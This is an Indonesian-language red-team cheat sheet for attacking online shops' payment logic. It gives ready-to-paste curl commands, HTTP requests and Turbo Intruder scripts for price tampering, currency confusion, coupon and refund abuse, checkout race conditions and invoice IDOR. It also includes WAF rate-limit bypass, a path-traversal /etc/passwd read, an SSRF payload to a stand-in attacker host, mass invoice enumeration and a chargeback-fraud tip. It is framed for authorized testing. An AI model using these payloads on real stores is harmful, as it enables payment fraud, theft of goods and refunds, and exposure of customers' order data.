# payment-logic — misc

# Payment & Commerce Logic — Referensi Red Team

## 1. Peta Serangan

| Kelas | Vektor utama | Endpoint khas | Dampak |
|---|---|---|---|
| Price manipulation | hidden field, header, JSON mass-assign | `/cart`, `/checkout`, `/orders` | underpay, overpay-balance |
| Currency confusion | `currency` param, `Accept-Language`, locale cookie | `/price`, `/cart/add` | bayar IDR, terima USD |
| Coupon stacking | order-of-apply, race, case/alias | `/coupon/apply` | diskon >100% |
| Refund abuse | partial refund loop, multi-account, chargeback | `/refund`, `/return` | double-refund, saldo negatif |
| Race di checkout | TOCTOU stok/saldo/kupon | `/checkout/confirm` | oversell, saldo dobel |
| IDOR invoice/order | sequential ID, UUIDv1, header `X-User-Id` | `/invoice/{id}`, `/orders/{id}/pdf` | data bocor, replay bayar |

Target referensi: **nginx 1.25.x + PHP 8.3 / Node 20 + Postgres 16**, browser uji **Chrome 131**, klien **curl 8.12**, **Burp Suite 2024.x**, **Turbo Intruder**.

---

## 2. Price Manipulation

### 2.1 Hidden field tampering
Kirim:
```http
POST /cart/checkout HTTP/2
Host: shop.example.tld
Content-Type: application/x-www-form-urlencoded

item_id=4401&qty=1&price=100&price_cents=100&unit_price=100
```
Muncul: `HTTP 302 /order/8821` dengan total `IDR 1.000`. Berhasil jika server memakai `price` dari body, bukan lookup DB.

Deteksi mass-assign — kirim semua kandidat sekaligus:
```
price=1&amount=1&total=1&subtotal=1&discount=100000&shipping=0&tax=0&currency=IDR&is_paid=true&status=paid
```
Kalau `status=paid` masuk, order jadi lunas tanpa bayar.

### 2.2 Header & cookie override
```bash
curl -ki https://shop.example.tld/api/v2/cart/checkout \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -H 'X-Internal: 1' \
  -H 'X-Original-Price: 100' \
  -b 'price_override=100; role=admin; debug=1' \
  --data 'sku=ABC&qty=1'
```
Lihat respons: `"total":100` → server mempercayai `price_override` cookie.

### 2.3 Negative quantity / negative price
```
qty=-1&price=250000
```
Total = `-250000` → saldo kredit. Cek apakah checkout mengizinkan `total < 0` ke payment gateway; banyak gateway menolak (`400 amount_invalid`) kecuali ada endpoint `/topup` yang reuse cart.

### 2.4 Desimal & pembulatan (floating point)
Kirim:
```
qty=0.1&price=0.1
```
Server PHP `(int)($total*100)` → 0 atau 1. Cek konsistensi DB (NUMERIC) vs gateway (integer cents). Bug klasik: total=0.00 saat item dikirim, tapi stok berkurang.

### 2.5 Mengapa gagal
- Server memakai `sku` → lookup DB (umum di Shopify, Magento 2.4.7).
- Gateway menolak `amount != server_amount` (Stripe `amount_mismatch`).
- CSRF + HMAC signature pada payload (umum di Tokopedia/Shopee).

---

## 3. Currency Confusion

### 3.1 Parameter `currency`
```
POST /api/checkout
{"items":[{"sku":"TV-55","qty":1}],"currency":"IDR"}
```
Produk berharga `USD 500`. Respons: `"total":500,"currency":"IDR"` → bayar Rp500, bukan Rp8jt.

Root cause: harga disimpan tanpa `currency_code`, atau FX conversion hanya di frontend.

### 3.2 Locale/cookie switch
```bash
curl -ki https://shop.example.tld/checkout \
  -b 'currency=IDR; locale=id-ID; country=ID' \
  --data 'sku=TV-55&qty=1'
```
Cek apakah respons `amount` dihitung ulang atau hanya label. Bandingkan dengan `Accept-Language: id-ID`.

### 3.3 Zero-decimal & 3-decimal mismatch
| Mata uang | Eksponen | Jebakan |
|---|---|---|
| JPY | 0 | kirim `100` untuk item ¥1000 |
| IDR | 0 (umum) | server anggap 2 desimal → Rp1 = 100 |
| KWD/BHD | 3 | rounding ke 2 → kerugian 0.9% per txn |

Payload: `{"amount":1000,"currency":"JPY"}` vs `{"amount":1000,"currency":"IDR"}` — kalau keduanya lolos dengan total sama, ada bug eksponen.

### 3.4 Race: ubah currency setelah harga ditampilkan
Turbo Intruder, gate 2 request:
- Req A: `/cart/add sku=TV-55` dengan `currency=IDR`
- Req B: `/checkout/confirm` dengan `currency=USD`
Kalau line-item tak menyimpan currency per baris, total tak konsisten.

### 3.5 Format lain
- `currency=IDR ` (trailing space) → fallback ke default (sering USD).
- `currency=idr` vs `IDR` — cache key terpisah di Cloudflare/Akamai → harga campur.

---

## 4. Coupon Stacking

### 4.1 Stack normal (harusnya mutual exclusion)
```
POST /coupon/apply {"code":"WELCOME10"}  → 200
POST /coupon/apply {"code":"WELCOME10"}  → 200 (double apply)
POST /coupon/apply {"code":"FREESHIP"}   → 200
POST /coupon/apply {"code":"CASHBACK"}   → 200
GET  /cart → discount 4x
```
Cek apakah `POST` kedua mengembalikan "already applied" atau menambah `discount` lagi. Banyak sistem menyimpan `coupon[]` di session tanpa dedup.

### 4.2 Case & whitespace alias
`WELCOME10`, `welcome10`, `Welcome10`, `WELCOME10 ` (spasi), `WELCOME-10`, `ＷELCOME10` (fullwidth). Kalau lolos 2+ kali → bug dedup case-sensitive.

### 4.3 Race condition (coupon single-use)
Turbo Intruder, 50 request paralel, gate 2 (`X-RaceGate`):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=50, engine=Engine.HTTP2)
    for i in range(50):
        engine.queue(target.req, gate='g1')
    engine.openGate('g1')
```
Kupon `SINGLE50` (limit 1) → persentase 200 OK > 1 → coupon leak. Di Postgres 16, ini terjadi saat `SELECT ... FOR UPDATE` tidak dipakai.

### 4.4 Reuse via user enumeration
- `/coupon/claim` dengan header `X-User-Id` berbeda, atau body `user_id` — cek IDOR ke kupon milik user lain.
- Duplicate account: email `a+1@x.tld` vs `a@x.tld` — apakah server normalisasi? Kalau tidak, satu orang klaim 10x.

### 4.5 Order-of-apply
Kombinasi:
1. Apply `CASHBACK100` (nominal) → total 100000
2. Apply `PERCENT50` → dihitung dari 100000, bukan 200000
3. Hapus `CASHBACK` → apakah `PERCENT50` recompute atau tetap?
Kirim sequence, snapshot `/cart` tiap langkah.

### 4.6 Integer overflow / negatif
`discount=100000` pada cart 50000 → total -50000. Lihat apakah checkout memblokir atau membuat saldo refund otomatis.

---

## 5. Refund Abuse

### 5.1 Double refund
```
POST /refund {"order_id":8821,"amount":50000,"reason":"item_defect"}
POST /refund {"order_id":8821,"amount":50000,"reason":"not_received"}
```
Jika idempoten salah → 2x refund. Cek header `Idempotency-Key`:
```bash
curl -X POST https://shop.example.tld/refund \
  -H 'Idempotency-Key: ' \
  -d '{"order_id":8821,"amount":50000}'
```
Key kosong ≠ reused key. Banyak contoh: key dibuat client-side, tak dicek uniqueness-dengan-endpoint.

### 5.2 Partial refund loop
Order 100000, refund 3x `amount=40000`. Total 120000 > 100000. Cek apakah server tracking `refunded_total`.

### 5.3 Refund ke metode berbeda
Order bayar via kartu kredit, refund minta ke **e-wallet** / **bank account**. Kalau server tak mengikat refund method = payment method, saldo bisa ditarik ke rekening penyerang (kasus umum fraud marketplace).

### 5.4 Refund race
Turbo Intruder 20x paralel ke `/refund` dengan `amount=100000`, order 100000. Harapan: 1 sukses. Realita: `refunded_total` dihitung non-atomik (`SELECT sum THEN INSERT`) → N sukses.

### 5.5 Return without item
- `POST /return` dengan `item_id` milik order lain (IDOR) → retur diterima, refund ke order asal.
- Manipulasi `tracking_no` (format bebas) → auto-approve bila ada integrasi kurir yang tak verifikasi.

### 5.6 Chargeback farming
Bukan teknik teknis tapi operasional: kartu virtual BIN tertentu + `billing_country` mismatch, refund di sisi merchant untuk hindari chargeback fee. Skala butuh banyak akun — lihat §8.

---

## 6. Race Condition di Checkout

### 6.1 Oversell stok
Turbo Intruder, 100 paralel, single packet attack:
```http
POST /checkout/confirm HTTP/2
Host: shop.example.tld
Content-Type: application/json

{"cart_id":"c_1","sku":"LIMITED","qty":1}
```
Gate 2 tunggu semua in-flight. Kalau stok=1 tapi 2+ `200 order_created` → `UPDATE stock = stock - 1 WHERE stock >= 1` tidak atomik, atau isolation `READ COMMITTED` + ORM `save()`.

### 6.2 Double-spend saldo
Saldo 100000, dua request paralel `POST /wallet/pay amount=100000` untuk dua order. Kalau saldo final -100000 → race.

### 6.3 Race di aplikasi kupon + cart
- Applicator kupon dan checkout dua transaksi terpisah tanpa row lock.
- Klien kirim checkout dua kali (double click) dengan `Idempotency-Key` sama → cek server dedup.

### 6.4 Last-byte sync (HTTP/2)
Untuk bypass rate-limit WAF (Cloudflare/Imperva), pakai last-byte synchronization di Turbo Intruder:
```python
engine = RequestEngine(endpoint=target.endpoint,
                       engine=Engine.HTTP2,
                       concurrentConnections=1)
for i in range(50):
    engine.queue(target.req, gate='lb')
```
Kirim semua request dalam 1 koneksi, tahan byte terakhir. WAF sering hanya hitung full request → burst lolos.

### 6.5 Mengapa gagal
- `SELECT ... FOR UPDATE` / `SERIALIZABLE` dengan retry.
- Redis `SETNX` lock per SKU (banyak e-commerce kecil salah: pakai `SET` bukan `SET NX`).
- Rate-limit di nginx `limit_req zone=checkout burst=2 nodelay` (nginx 1.25) → bukan fix race, hanya pelambatan.

---

## 7. IDOR di Invoice / Order

### 7.1 Sequential integer
```
GET /invoice/1001  (milik Anda)
GET /invoice/1002  (milik orang lain)
GET /invoice/1003
```
Uji dengan akun A dan B. Respons cepat vs `403` — perbedaan timing ~10ms menandakan objeknya ada tapi unauthorized.

### 7.2 UUIDv1 & korelasi waktu
Jika ID `f47ac10b-58cc-11ed-...` (v1), timestamp node tercampur. Forecast ID dengan `uuid-forecaster`; banyak endpoint `/orders/{uuid}/pdf` hanya authorize via "UUID tak bisa ditebak" — salah.

### 7.3 Header & parameter override
```bash
curl -ki 'https://shop.example.tld/api/orders/1002' \
  -H 'X-User-Id: 1001' \
  -H 'X-Account-Id: 1001' \
  -H 'X-Forwarded-User: 1001'
```
Banyak reverse proxy joint (mis. `oauth2-proxy`, `traefik-forward-auth`) yang meneruskan header user dari upstream — kalau `trust_forwarded_headers=true` tanpa strip header klien, IDOR trivial.

### 7.4 Nested & mass-assign
```
GET /api/orders/1002?include=payment,shipping,user
PATCH /api/orders/1002 {"user_id":1001}
```
`user_id` di body → ownership transfer (sering di Laravel `$fillable` yang terlalu longgar).

### 7.5 Invoice PDF generation
`GET /invoice/1002/pdf?template=../../etc/passwd` (path traversal di template) atau `template=http://attacker/tpl` (SSRF). Cek juga header `Content-Disposition` — kalau `filename` bisa dikontrol, ada stored XSS di viewer PDF (Chrome 131 menutup SVG di PDF, tapi widget HTML di viewer lama masih).

### 7.6 Guest order token
Order guest punya token di URL: `/orders/abc123/view?email=x@y.tld`. Kalau token di body bisa ditebak atau tak diikat ke email → IDOR. Uji dengan `token` kosong, `token=null`, `token=0`.

### 7.7 Mass enumeration
Turbo Intruder ke `/invoice/{n}` dengan n = 1000..2000, filter by `200` + `Content-Length`. Simpan PDF untuk parsing.

---

## 8. Jebakan Operasional Lapangan

| Jebakan | Gejala | Mitigasi uji |
|---|---|---|
| **Race gagal karena TCP/keepalive** | 50 request tapi hasil serial | Pakai HTTP/2 single connection + last-byte, atau HTTP/1.1 pipeline di Burp |
| **WAF rate-limit menyamar sebagai 429** | “Race gagal”, padahal request tak sampai origin | Uji dulu 1 request + `X-Forwarded-For` random; cek header `cf-ray` / `x-akamai-*` |
| **Cache (CDN) menyajikan harga lain** | Currency confusion inkonsisten | Sertakan `Cache-Control: no-store`, `Vary` test; cek `Age:` header |
| **Feature flag / A-B test** | Bug hanya di 10% sesi | Kirim `Cookie: ab_bucket=test`, atau ulangi 100x catat variasi |
| **Idempotency-Key dari client** | Refund dobel gagal karena cache middleware | Coba tanpa header, dengan key random tiap request |
| **Gateway sandbox vs prod** | Amount mismatch di prod | Uji dengan nominal kecil (1000), bukan 1 |
| **Email/SMS OTP** | Race kupon bikin OTP hangus | Hindari checkout penuh; fokus endpoint `/cart` dan `/coupon` |
| **Decimal locale server** | `0,5` vs `0.5` di PHP `setlocale` | Kirim keduanya |
| **Postgres `READ COMMITTED` default** | Race lolos di dev (SQLite!) tapi tak di prod | Konfirmasi stack DB dari error page/timing |
| **Time-skew UUIDv4** | Forecast gagal | Pakai regex-generator lain; v4 tak bisa diprediksi |
| **nginx `limit_req` memblok burst** | Race hidup di origin tapi mati di edge | Turunkan konkurensi ke `burst` limit, atau temukan path lain tanpa limit |
| **Cookie `SameSite=Strict`** | CSRF-based price tampering gagal | Kirim request same-site via subdomain takeover atau open redirect |
| **Chrome 131 third-party cookie phase-out** | Session fix di iframe payment gagal | Uji dengan `--disable-features=TrackingProtection3p` |
| **Stok pre-allocated di Redis** | Race oversell tak muncul di DB | Monitor Redis `DECR` vs DB, uji dua lapisan |
| **Refund ke original method only** | Refund to wallet gagal | Cek `/refund/method` atau endpoint topup |
| **App-level lock per user** | Race per-user tak muncul | Ubah `user_id`/`device_id`, coba dua akun paralel |

---

## 9. Checklist Request Cepat (siap tempel)

```bash
# 1. Price tamper
curl -ki https://T/api/cart/checkout -H 'Content-Type: application/json' \
  -d '{"sku":"X","qty":1,"price":1,"currency":"IDR"}'

# 2. Currency
curl -ki https://T/api/checkout -H 'Content-Type: application/json' \
  -d '{"sku":"TV","qty":1,"currency":"IDR"}'

# 3. Coupon double
for c in WELCOME10 welcome10 'WELCOME10 ' ; do
  curl -ki -b jar -c jar https://T/coupon/apply --data-urlencode "code=$c"
done

# 4. Refund idempotency kosong
curl -ki -X POST https://T/refund -H 'Idempotency-Key;' \
  -d 'order_id=1&amount=1'

# 5. IDOR invoice
for i in $(seq 1000 1010); do
  curl -kso /dev/null -w "%{http_code} %{size_download} $i\n" https://T/invoice/$i
done
```

---

## 10. Angka Rujukan

- Chrome 131: `Set-Cookie` tanpa `SameSite` default `Lax`; `Partitioned` butuh `Secure`.
- nginx 1.25: `limit_req_zone $binary_remote_addr zone=co:10m rate=5r/s;` — burst default 0 bila tak diset.
- Postgres 16: default `default_transaction_isolation = read committed`; `SERIALIZABLE` retry wajib.
- Stripe API `2024-06-20`: `amount` integer dalam unit minor; mismatch → `400 amount_mismatch`.
- PHP 8.3: `float` 0.1+0.2 = 0.30000000000000004; `bcmath`/`intdiv` disarankan.
- MySQL 8.0.36 / MariaDB 11: `DECIMAL` aman; `FLOAT` tidak.

---

## [reasoning trace]


